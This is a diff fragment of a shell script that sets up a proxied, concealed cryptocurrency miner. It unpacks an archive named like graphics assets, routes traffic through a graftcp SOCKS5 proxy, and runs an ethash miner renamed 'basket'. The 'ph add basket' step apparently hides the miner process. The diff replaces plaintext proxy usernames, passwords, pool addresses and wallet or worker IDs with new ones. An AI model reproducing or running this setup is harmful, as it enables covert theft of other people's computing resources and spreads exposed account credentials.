@@ -23,9 +23,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = gpusocks3.wot.mrface.com:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
+socks5 = p.webshare.io:80
+socks5_username = snzyphyd-il-nl-5
+socks5_password = 8jq95zaxr7jf
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -58,4 +58,4 @@ chmod +x basket
 
 ph add basket
 
-./basket -a ethash -o ethproxy+ssl://eth-de.flexpool.io:5555 -u 0xb75828df3cACcB5b7FeAeB0EA81A552D71437D01.NB -log --proxy mikrotik999:Elibawnos@gpusocks3.wot.mrface.com:1080
+./basket -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001.k -log --proxy snzyphyd-il-nl-5:8jq95zaxr7jf@p.webshare.io:80
